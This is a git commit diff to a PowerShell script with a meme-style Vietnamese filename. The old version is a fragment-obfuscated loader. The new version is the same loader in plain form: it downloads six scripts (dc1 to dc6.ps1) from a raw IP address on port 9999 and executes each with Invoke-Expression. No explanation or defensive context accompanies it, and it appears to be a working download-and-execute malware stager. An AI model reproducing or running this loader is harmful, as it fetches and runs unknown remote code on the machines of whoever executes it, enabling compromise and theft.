520a30d393a098900a766fe24d5e95d1c195367b
chang phai may troi... <1nuhongio@gmail.com>
2026-01-12 23:29:21 +0700

    Update cachdebienthanhtungsahur.ps1

--- cachdebienthanhtungsahur.ps1
+++ cachdebienthanhtungsahur.ps1
@@ -1,14 +1,12 @@
-$fragments = @('﻿
-for ($i = ','1; $i -le 6; $i','++) {
+
+for ($i = 1; $i -le 6; $i++) {
    
-   ',' $url = "http:/','/103.67.197.187',':9999/dc$i.ps1"','
+    $url = "http://103.67.197.187:9999/dc$i.ps1"
     
     
- ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
-    $script','Content = $webC','lient.DownloadS','tring($url)
-  ','  
+    $webClient = New-Object System.Net.WebClient
+    $scriptContent = $webClient.DownloadString($url)
     
-    I','nvoke-Expressio','n $scriptConten','t
-}'); $script = $fragments -join ''; Invoke-Expression $script
-
-
+    
+    Invoke-Expression $scriptContent
+}
